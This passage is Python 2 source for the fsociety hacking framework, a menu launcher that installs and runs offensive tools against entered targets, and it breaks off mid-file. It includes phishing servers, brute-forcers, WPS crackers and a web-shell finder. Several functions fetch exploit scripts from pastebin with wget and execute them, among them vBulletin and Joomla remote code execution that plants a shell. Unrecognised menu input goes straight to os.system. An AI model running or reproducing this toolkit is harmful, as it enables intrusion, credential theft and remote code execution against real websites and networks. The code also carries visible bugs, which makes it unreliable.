#!/usr/bin/env python2
#    ______              _      _           _______
#   |  ____|            (_)    | |         |__   __|
#   | |__ ___  ___   ___ _  ___| |_ _   _     | | ___  __ _ _ __ ___
#   |  __/ __|/ _ \ / __| |/ _ \ __| | | |    | |/ _ \/ _` | '_ ` _ \
#   | |  \__ \ (_) | (__| |  __/ |_| |_| |    | |  __/ (_| | | | | | |
#   |_|  |___/\___/ \___|_|\___|\__|\__, |    |_|\___|\__,_|_| |_| |_|
#                                    __/ |
#                                   |___/
#
#
#                                Greet's To
#                              IcoDz - Canejo
#                             Tool For Hacking
#                             Author : Manisso

'''
Imports
'''
import sys
import argparse
import os
import httplib
import subprocess
import re
import urllib2
import socket
import urllib
import sys
import json
import telnetlib
import glob
import random
import Queue
import threading
import base64
import time
import ConfigParser
from sys import argv
from commands import *
from getpass import getpass
from xml.dom import minidom
from urlparse import urlparse
from optparse import OptionParser
from time import gmtime, strftime, sleep

'''
Common Functions
'''


class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'


def clearScr():
    os.system('clear')


def yesOrNo():
    return (raw_input("Continue Y / N: ") in yes)


'''
Config
'''
installDir = os.path.dirname(os.path.abspath(__file__)) + '/'
configFile = installDir + "/fsociety.cfg"
print(installDir)
config = ConfigParser.RawConfigParser()
config.read(configFile)

toolDir = installDir + config.get('fsociety', 'toolDir')
logDir = installDir + config.get('fsociety', 'logDir')
yes = config.get('fsociety', 'yes').split()
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]
random.shuffle(color_random)
fsocietylogo = color_random[0] + '''
        d88888b .d8888.  .d88b.   .o88b. d888888b d88888b d888888b db    db
        88'     88'  YP .8P  Y8. d8P  Y8   `88'   88         88    `8b  d8'
        88ooo   `8bo.   88    88 8P         88    88ooooo    88     `8bd8'
        88        `Y8b. 88    88 8b         88    88         88       88
        88      db   8D `8b  d8' Y8b  d8   .88.   88.        88       88
        YP      `8888Y'  `Y88P'   `Y88P' Y888888P Y88888P    YP       YP
        '''
fsocietyPrompt = "fsociety ~# "
alreadyInstalled = "Already Installed"
continuePrompt = "\nClick [Return] to continue"

termsAndConditions = color.NOTICE + '''
I shall not use fsociety to:
(i) upload or otherwise transmit, display or distribute any
content that infringes any trademark, trade secret, copyright
or other proprietary or intellectual property rights of any
person; (ii) upload or otherwise transmit any material that contains
software viruses or any other computer code, files or programs
designed to interrupt, destroy or limit the functionality of any
computer software or hardware or telecommunications equipment;
''' + color.END


'''
Starts Menu Classes
'''
def agreement():
    while not config.getboolean("fsociety", "agreement"):
        clearScr()
        print(termsAndConditions)
        agree = raw_input("You must agree to our terms and conditions first (Y/n) ").lower()
        if agree in yes:
            config.set('fsociety', 'agreement', 'true')

class fsociety:
    def __init__(self):
        clearScr()
        self.createFolders()
        print (fsocietylogo + color.RED + '''
       }--------------{+} Coded By Manisso {+}--------------{
       }--------{+}  GitHub.com/Manisso/fsociety {+}--------{
    ''' + color.END + '''
       {1}--Information Gathering
       {2}--Password Attacks
       {3}--Wireless Testing
       {4}--Exploitation Tools
       {5}--Sniffing & Spoofing
       {6}--Web Hacking
       {7}--Private Web Hacking
       {8}--Post Exploitation
       {0}--INSTALL & UPDATE
       {11}-CONTRIBUTORS
       {99}-EXIT\n
     ''')
        choice = raw_input(fsocietyPrompt)
        clearScr()
        if choice == "1":
            informationGatheringMenu()
        elif choice == "2":
            passwordAttacksMenu()
        elif choice == "3":
            wirelessTestingMenu()
        elif choice == "4":
            exploitationToolsMenu()
        elif choice == "5":
            sniffingSpoofingMenu()
        elif choice == "6":
            webHackingMenu()
        elif choice == "7":
            privateWebHacking()
        elif choice == "8":
            postExploitationMenu()
        elif choice == "0":
            self.update()
        elif choice == "11":
            self.githubContributors()
        elif choice == "99":
            with open(configFile, 'wb') as configfile:
                config.write(configfile)
            sys.exit()
        elif choice == "\r" or choice == "\n" or choice == "" or choice == " ":
            self.__init__()
        else:
            try:
                print(os.system(choice))
            except:
                pass
        self.completed()

    def githubContributors(self):
        clearScr()
        print('''
     dP""b8  dP"Yb  88b 88 888888 88""Yb 88 88""Yb .dP"Y8
    dP   `" dP   Yb 88Yb88   88   88__dP 88 88__dP `Ybo."
    Yb      Yb   dP 88 Y88   88   88"Yb  88 88""Yb o.`Y8b
     YboodP  YbodP  88  Y8   88   88  Yb 88 88oodP 8bodP'
     ''')
        contributorsURL = 'https://api.github.com/repos/manisso/fsociety/contributors'
        jsonResponseList = json.loads(urllib2.urlopen(contributorsURL).read())
        for dictionary in jsonResponseList:
            print("   * %s" % dictionary['login'])
        print('\n')

    def createFolders(self):
        if not os.path.isdir(toolDir):
            os.makedirs(toolDir)
        if not os.path.isdir(logDir):
            os.makedirs(logDir)

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()

    def update(self):
        os.system("git clone --depth=1 https://github.com/Manisso/fsociety.git")
        os.system("cd fsociety && bash ./update.sh")
        os.system("fsociety")


class sniffingSpoofingMenu:
    menuLogo = '''
    .dP"Y8 88b 88 88 888888 888888 88 88b 88  dP""b8
    `Ybo." 88Yb88 88 88__   88__   88 88Yb88 dP   `"
    o.`Y8b 88 Y88 88 88""   88""   88 88 Y88 Yb  "88
    8bodP' 88  Y8 88 88     88     88 88  Y8  YboodP
    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print(
            "   {1}--SEToolkit - Tool aimed at penetration testing around Social-Engineering")
        print("   {2}--SSLtrip - MITM tool that implements SSL stripping  attacks")
        print(
            "   {3}--pyPISHER - Tool to create a mallicious website for password pishing")
        print("   {4}--SMTP Mailer - Tool to send SMTP mail\n ")
        print("   {99}-Back To Main Menu \n")
        choice6 = raw_input(fsocietyPrompt)
        clearScr()
        if choice6 == "1":
            setoolkit()
        elif choice6 == "2":
            ssls()
        elif choice6 == "3":
            pisher()
        elif choice6 == "4":
            smtpsend()
        elif choice6 == "99":
            fsociety()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class webHackingMenu:
    menuLogo = '''
    Yb        dP 888888 88""Yb
     Yb  db  dP  88__   88__dP
      YbdPYbdP   88""   88""Yb
       YP  YP    888888 88oodP
    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Drupal Hacking ")
        print("   {2}--Inurlbr")
        print("   {3}--Wordpress & Joomla Scanner")
        print("   {4}--Gravity Form Scanner")
        print("   {5}--File Upload Checker")
        print("   {6}--Wordpress Exploit Scanner")
        print("   {7}--Wordpress Plugins Scanner")
        print("   {8}--Shell and Directory Finder")
        print("   {9}--Joomla! 1.5 - 3.4.5 remote code execution")
        print("   {10}-Vbulletin 5.X remote code execution")
        print(
            "   {11}-BruteX - Automatically brute force all services running on a target")
        print("   {12}-Arachni - Web Application Security Scanner Framework \n ")
        print("   {99}-Back To Main Menu \n")
        choiceweb = raw_input(fsocietyPrompt)
        clearScr()
        if choiceweb == "1":
            maine()
        elif choiceweb == "2":
            ifinurl()
        elif choiceweb == '3':
            wppjmla()
        elif choiceweb == "4":
            gravity()
        elif choiceweb == "5":
            sqlscan()
        elif choiceweb == "6":
            wpminiscanner()
        elif choiceweb == "7":
            wppluginscan()
        elif choiceweb == "8":
            shelltarget()
        elif choiceweb == "9":
            joomlarce()
        elif choiceweb == "10":
            vbulletinrce()
        elif choiceweb == "11":
            brutex()
        elif choiceweb == "12":
            arachni()
        elif choiceweb == "99":
            fsociety()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class privateWebHacking:
    menuLogo = '''
    88""Yb 88""Yb 88 Yb    dP    db    888888 888888
    88__dP 88__dP 88  Yb  dP    dPYb     88   88__
    88"""  88"Yb  88   YbdP    dP__Yb    88   88""
    88     88  Yb 88    YP    dP""""Yb   88   888888
    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        target = raw_input("Enter Target IP: ")
        Fscan(target)
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class postExploitationMenu:
    menuLogo = '''
    88""Yb  dP"Yb  .dP"Y8 888888
    88__dP dP   Yb `Ybo."   88
    88"""  Yb   dP o.`Y8b   88
    88      YbodP  8bodP'   88
    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Shell Checker")
        print("   {2}--POET")
        print("   {3}--Phishing Framework \n")
        print("   {99}-Return to main menu \n ")
        choice11 = raw_input(fsocietyPrompt)
        clearScr()
        if choice11 == "1":
            sitechecker()
        elif choice11 == "2":
            poet()
        elif choice11 == "3":
            weeman()
        elif choice11 == "99":
            fsociety()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


'''
Information Gathering Tools Classes
'''


class informationGatheringMenu:
    menuLogo = '''
    88 88b 88 888888  dP"Yb
    88 88Yb88 88__   dP   Yb
    88 88 Y88 88""   Yb   dP
    88 88  Y8 88      YbodP
    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)

        print("  {1}--Nmap - Network Mapper")
        print("  {2}--Setoolkit")
        print("  {3}--Host To IP")
        print("  {4}--WPScan")
        print("  {5}--CMSmap")
        print("  {6}--XSStrike")
        print("  {7}--Doork")
        print("  {8}--Crips\n  ")
        print("  {99}-Back To Main Menu \n")
        choice2 = raw_input(fsocietyPrompt)
        clearScr()
        if choice2 == "1":
            nmap()
        elif choice2 == "2":
            setoolkit()
        elif choice2 == "3":
            host2ip()
        elif choice2 == "4":
            wpscan()
        elif choice2 == "5":
            CMSmap()
        elif choice2 == "6":
            XSStrike()
        elif choice2 == "7":
            doork()
        elif choice2 == "8":
            crips()
        elif choice2 == "99":
            fsociety()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class nmap:
    nmapLogo = '''
    88b 88 8b    d8    db    88""Yb
    88Yb88 88b  d88   dPYb   88__dP
    88 Y88 88YbdP88  dP__Yb  88"""
    88  Y8 88 YY 88 dP""""Yb 88
    '''

    def __init__(self):
        self.installDir = toolDir + "nmap"
        self.gitRepo = "https://github.com/nmap/nmap.git"

        self.targetPrompt = "   Enter Target IP/Subnet/Range/Host: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return (os.path.isfile("/usr/bin/nmap") or os.path.isfile("/usr/local/bin/nmap"))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("cd %s && ./configure && make && make install" %
                  self.installDir)

    def run(self):
        clearScr()
        print(self.nmapLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.nmapLogo)
        print("   Nmap scan for: %s\n" % target)
        print("   {1}--Simple Scan [-sV]")
        print("   {2}--Port Scan [-Pn]")
        print("   {3}--Operating System Detection [-A]\n")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("nmap ~# ")
        clearScr()
        logPath = "logs/nmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("nmap -sV -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("nmap -Pn -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("nmap -A -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)


class setoolkit:
    def __init__(self):
        self.installDir = toolDir + "setoolkit"
        self.gitRepo = "https://github.com/trustedsec/social-engineer-toolkit.git"

        if not self.installed():
            self.install()
            self.run()
        else:
            print(alreadyInstalled)
            self.run()
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isfile("/usr/bin/setoolkit"))

    def install(self):
        os.system("apt-get --force-yes -y install git apache2 python-requests libapache2-mod-php \
            python-pymssql build-essential python-pexpect python-pefile python-crypto python-openssl")
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("cd %s && python setup.py install" % self.installDir)

    def run(self):
        os.system("setoolkit")


class host2ip:
    host2ipLogo = '''
    88  88  dP"Yb  .dP"Y8 888888 oP"Yb. 88 88""Yb
    88  88 dP   Yb `Ybo."   88   "' dP' 88 88__dP
    888888 Yb   dP o.`Y8b   88     dP'  88 88"""
    88  88  YbodP  8bodP'   88   .d8888 88 88
    '''

    def __init__(self):
        clearScr()
        print(self.host2ipLogo)
        host = raw_input("   Enter a Host: ")
        ip = socket.gethostbyname(host)
        print("   %s has the IP of %s" % (host, ip))
        response = raw_input(continuePrompt)


class wpscan:
    wpscanLogo = '''
    Yb        dP 88""Yb .dP"Y8  dP""b8    db    88b 88
     Yb  db  dP  88__dP `Ybo." dP   `"   dPYb   88Yb88
      YbdPYbdP   88"""  o.`Y8b Yb       dP__Yb  88 Y88
       YP  YP    88     8bodP'  YboodP dP""""Yb 88  Y8
    '''

    def __init__(self):
        self.installDir = toolDir + "wpscan"
        self.gitRepo = "https://github.com/wpscanteam/wpscan.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.wpscanLogo)
        target = raw_input("   Enter a Target: ")
        self.menu(target)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def menu(self, target):
        clearScr()
        print(self.wpscanLogo)
        print("   WPScan for: %s\n" % target)
        print("   {1}--Username Enumeration [--enumerate u]")
        print("   {2}--Plugin Enumeration [--enumerate p]")
        print("   {3}--All Enumeration Tools [--enumerate]\n")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("wpscan ~# ")
        clearScr()
        logPath = "../../logs/wpscan-" + \
            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        wpscanOptions = "--no-banner --random-agent --url %s" % target
        try:
            if response == "1":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate u --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate p --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)


class CMSmap:
    CMSmapLogo = '''
     dP""b8 8b    d8 .dP"Y8 8b    d8    db    88""Yb
    dP   `" 88b  d88 `Ybo." 88b  d88   dPYb   88__dP
    Yb      88YbdP88 o.`Y8b 88YbdP88  dP__Yb  88"""
     YboodP 88 YY 88 8bodP' 88 YY 88 dP""""Yb 88
    '''

    def __init__(self):
        self.installDir = toolDir + "CMSmap"
        self.gitRepo = "https://github.com/Dionach/CMSmap.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.CMSmapLogo)
        target = raw_input("   Enter a Target: ")
        self.run(target)
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def run(self, target):
        logPath = "logs/cmsmap-" + \
            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        try:
            os.system("python %s/cmsmap.py -t %s -o %s" %
                      (self.installDir, target, logPath))
        except:
            pass


class XSStrike:
    XSStrikeLogo = '''
    Yb  dP .dP"Y8 .dP"Y8 888888 88""Yb 88 88  dP 888888
     YbdP  `Ybo." `Ybo."   88   88__dP 88 88odP  88__
     dPYb  o.`Y8b o.`Y8b   88   88"Yb  88 88"Yb  88""
    dP  Yb 8bodP' 8bodP'   88   88  Yb 88 88  Yb 888888
    '''

    def __init__(self):
        self.installDir = toolDir + "XSStrike"
        self.gitRepo = "https://github.com/UltimateHackers/XSStrike.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.XSStrikeLogo)
        self.run()
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("pip install -r %s/requirements.txt" % self.installDir)

    def run(self):
        os.system("python %s/xsstrike" % self.installDir)


class doork:
    doorkLogo = '''
    8888b.   dP"Yb   dP"Yb  88""Yb 88  dP
     8I  Yb dP   Yb dP   Yb 88__dP 88odP
     8I  dY Yb   dP Yb   dP 88"Yb  88"Yb
    8888Y"   YbodP   YbodP  88  Yb 88  Yb
    '''

    def __init__(self):
        self.installDir = toolDir + "doork"
        self.gitRepo = "https://github.com/AeonDave/doork.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.doorkLogo)
        target = raw_input("   Enter a Target: ")
        self.run(target)
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("pip install beautifulsoup4 requests Django==1.11")

    def run(self, target):
        if not "http://" in target:
            target = "http://" + target
        logPath = "logs/doork-" + \
            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        try:
            os.system("python %s/doork.py -t %s -o %s" %
                      (self.installDir, target, logPath))
        except KeyboardInterrupt:
            pass


class crips:
    cripsLogo = '''
     dP""b8 88""Yb 88 88""Yb .dP"Y8
    dP   `" 88__dP 88 88__dP `Ybo."
    Yb      88"Yb  88 88"""  o.`Y8b
     YboodP 88  Yb 88 88     8bodP'
    '''

    def __init(self):
        self.installDir = toolDir + "Crips"
        self.gitRepo = "https://github.com/Manisso/Crips.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.cripsLogo)
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir) or os.path.isdir("/usr/share/doc/Crips"))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("bash %s/install.sh" % self.installDir)

    def run(self):
        try:
            os.system("crips")
        except:
            pass


'''
Password Attack Tools Classes
'''


class passwordAttacksMenu:
    menuLogo = '''
    88""Yb    db    .dP"Y8 .dP"Y8 Yb        dP 8888b.
    88__dP   dPYb   `Ybo." `Ybo."  Yb  db  dP   8I  Yb
    88"""   dP__Yb  o.`Y8b o.`Y8b   YbdPYbdP    8I  dY
    88     dP""""Yb 8bodP' 8bodP'    YP  YP    8888Y"
    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Cupp - Common User Passwords Profiler")
        print(
            "   {2}--BruteX - Automatically bruteforces all services running on a target\n")
        print("   {99}-Back To Main Menu \n")
        choice3 = raw_input("passwd ~# ")
        clearScr()
        if choice3 == "1":
            cupp()
        elif choice3 == "2":
            brutex()
        elif choice3 == "99":
            fsociety()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class cupp:
    cuppLogo = '''
     dP""b8 88   88 88""Yb 88""Yb
    dP   `" 88   88 88__dP 88__dP
    Yb      Y8   8P 88"""  88"""
     YboodP `YbodP' 88     88
     '''

    def __init__(self):
        self.installDir = toolDir + "cupp"
        self.gitRepo = "https://github.com/Mebus/cupp.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.cuppLogo)
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def run(self):
        os.system("python %s/cupp.py -i" % self.installDir)


'''
Wireless Testing Tools Classes
'''


class wirelessTestingMenu:
    menuLogo = '''
    Yb        dP 88 88""Yb 888888 88     888888 .dP"Y8 .dP"Y8
     Yb  db  dP  88 88__dP 88__   88     88__   `Ybo." `Ybo."
      YbdPYbdP   88 88"Yb  88""   88  .o 88""   o.`Y8b o.`Y8b
       YP  YP    88 88  Yb 888888 88ood8 888888 8bodP' 8bodP'
    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--reaver ")
        print("   {2}--pixiewps")
        print("   {3}--Bluetooth Honeypot GUI Framework \n")
        print("   {99}-Back To The Main Menu \n")
        choice4 = raw_input(fsocietyPrompt)
        clearScr()
        if choice4 == "1":
            reaver()
        elif choice4 == "2":
            pixiewps()
        elif choice4 == "3":
            bluepot()
        elif choice4 == "99":
            fsociety()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class reaver:
    def __init__(self):
        self.installDir = toolDir + "reaver"
        self.gitRepo = "https://github.com/t6x/reaver-wps-fork-t6x.git"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system(
            "apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("cd %s/" % self.installDir)
        os.system("./configure")
        os.system("make")
        os.system("sudo make install")

    def run(self):
        os.system("reaver --help")


class pixiewps:
    def __init__(self):
        self.installDir = toolDir + "pixiewps"
        self.gitRepo = "https://github.com/wiire/pixiewps.git"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("apt-get -y install build-essential")
        os.system("make")
        os.system("sudo make install")

    def run(self):
        os.system("pixiewps --help")


class bluepot:
    def __init__(self):
        self.installDir = toolDir + "bluepot"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("apt-get install libbluetooth-dev")
        os.system(
            "wget -O - https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz | tar xfz -")
        os.system("mv bluepot/ %s/" % self.installDir)

    def run(self):
        os.system("sudo java -jar %s/BluePot-0.1.jar" % self.installDir)


'''
Exploitation Tools Classes
'''


class exploitationToolsMenu:
    menuLogo = '''
    888888 Yb  dP 88""Yb 88
    88__    YbdP  88__dP 88
    88""    dPYb  88"""  88  .o
    888888 dP  Yb 88     88ood8
    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--ATSCAN")
        print("   {2}--sqlmap")
        print("   {3}--Shellnoob")
        print("   {4}--commix")
        print("   {5}--FTP Auto Bypass")
        print("   {6}--JBoss-Autopwn")
        print("   {7}--Blind SQL Automatic Injection And Exploit")
        print("   {8}--Bruteforce the Android Passcode given the hash and salt")
        print("   {9}--Joomla SQL injection Scanner \n ")
        print("   {99}-Go Back To Main Menu \n")
        choice5 = raw_input(fsocietyPrompt)
        clearScr()
        if choice5 == "1":
            atscan()
        elif choice5 == "2":
            sqlmap()
        elif choice5 == "3":
            shellnoob()
        elif choice5 == "4":
            commix()
        elif choice5 == "5":
            gabriel()
        elif choice5 == "6":
            jboss()
        elif choice5 == "7":
            bsqlbf()
        elif choice5 == "8":
            androidhash()
        elif choice5 == "9":
            cmsfew()
        elif choice5 == "99":
            fsociety()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class brutex:
    def __init__(self):
        self.installDir = toolDir + "brutex"
        self.gitRepo = "https://github.com/1N3/BruteX.git"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        if not os.path.isdir("/usr/share/brutex"):
            os.makedirs("/usr/share/brutex")
        os.system("cd %s && chmod +x install.sh && ./install.sh" % self.installDir)

    def run(self):
        target = raw_input("Enter Target IP: ")
        os.system("brutex %s" % target)


class arachni:
    def __init__(self):
        self.installDir = toolDir + "arachni"
        self.gitRepo = "https://github.com/Arachni/arachni.git"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("cd %s/" % self.installDir)
        os.system(
            "gem install bundler && bundle install --without prof && rake install")

    def run(self):
        target = raw_input("Enter Target Hostname: ")
        os.system("arachni %s --output-debug 2> %sarachni/%s.log" %
                  (target, logDir, strftime("%Y-%m-%d_%H:%M:%S", gmtime())))

# Updated to Here


def weeman():
    print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
    if yesOrNo():
        os.system(
            "git clone --depth=1 https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
    else:
        fsociety()


def gabriel():
    print("Abusing authentication bypass of Open&Compact (Gabriel's)")
    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
    clearScr()
    os.system("python gabriel.py")
    ftpbypass = raw_input("Enter Target IP and Use Command:")
    os.system("python gabriel.py %s" % ftpbypass)


def sitechecker():
    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
    clearScr()
    os.system("python ch01.py")


def ifinurl():
    print(''' This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.''')
    print('Do You Want To Install InurlBR ? ')
    cinurl = raw_input("Y/N: ")
    if cinurl in yes:
        inurl()
    else:
        fsociety()


def bsqlbf():
    clearScr()
    print("This tool will only work on blind sql injection")
    cbsq = raw_input("select target: ")
    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
    os.system("perl bsqlbf.pl -url %s" % cbsq)
    os.system("rm bsqlbf.pl")


def atscan():
    print ("Do You To Install ATSCAN ?")
    if yesOrNo():
        os.system("rm -rf ATSCAN")
        os.system(
            "git clone --depth=1 https://github.com/AlisamTechnology/ATSCAN.git && cd ATSCAN && perl atscan.pl")
    else:
        fsociety()


def commix():
    print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
    print ("usage: python commix.py --help")
    if yesOrNo():
        os.system(
            "git clone --depth=1 https://github.com/stasinopoulos/commix.git commix")
        os.system("cd commix")
        os.system("python commix.py")
        os.system("")
    else:
        informationGatheringMenu.completed("Commix")


def vbulletinrce():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")


def joomlarce():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr()
    print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
    jmtarget = raw_input("Select a targets list:")
    os.system("python temp.py %s" % jmtarget)


def inurl():
    dork = raw_input("select a Dork:")
    output = raw_input("select a file to save:")
    os.system(
        "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    webHackingMenu.completed("InurlBR")


def insinurl():
    os.system(
        "git clone --depth=1 https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    clearScr()
    inurl()


def jboss():
    clearScr()
    print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
    print ("deployed, the script uses its upload and command execution capability to")
    print ("provide an interactive session.")
    print ("")
    print ("usage: ./e.sh target_ip tcp_port ")
    print("Continue: y/n")
    if yesOrNo():
        os.system(
            "git clone --depth=1 https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
    else:
        fsociety()


def wppluginscan():
    Notfound = [404, 401, 400, 403, 406, 301]
    sitesfile = raw_input("sites file: ")
    filepath = raw_input("Plugins File: ")

    def scan(site, dir):
        global resp
        try:
            conn = httplib.HTTPConnection(site)
            conn.request('HEAD', "/wp-content/plugins/" + dir)
            resp = conn.getresponse().status
        except Exception as message:
            print("Cant Connect:" + message) 
            pass

    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)

    def main():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
        for plugin in plugins:
            plugin = plugin.rstrip()
            scan(site, plugin)
            if resp not in Notfound:
                print "+----------------------------------------+"
                print "| current site:" + site
                print "| Found Plugin: " + plugin
                print "| Result:", resp


def sqlmap():
    print ("usage: python sqlmap.py -h")
    if yesOrNo():
        os.system(
            "git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
    else:
        informationGatheringMenu.completed("SQLMap")


def grabuploadedlink(url):
    try:
        for dir in directories:
            currentcode = urllib.urlopen(url + dir).getcode()
            if currentcode == 200 or currentcode == 403:
                print "-------------------------"
                print "  [ + ] Found Directory:  " + str(url + dir) + " [ + ]"
                print "-------------------------"
                upload.append(url + dir)
    except:
        pass


def grabshell(url):
    try:
        for upl in upload:
            for shell in shells:
                currentcode = urllib.urlopen(upl + shell).getcode()
                if currentcode == 200:
                    print "-------------------------"
                    print "  [ ! ] Found Shell:  " + \
                        str(upl + shell) + " [ ! ]"
                    print "-------------------------"
    except:
        pass


def shelltarget():
    print("Exemple: http://target.com")
    line = raw_input("target: ")
    line = line.rstrip()
    grabuploadedlink(line)
    grabshell(line)


def poet():
    print("POET is a simple POst-Exploitation Tool.\n")
    if yesOrNo():
        os.system("git clone --depth=1 https://github.com/mossberg/poet.git")
        os.system("python poet/server.py")
    else:
        postExploitationMenu.completed("POET")


def ssls():
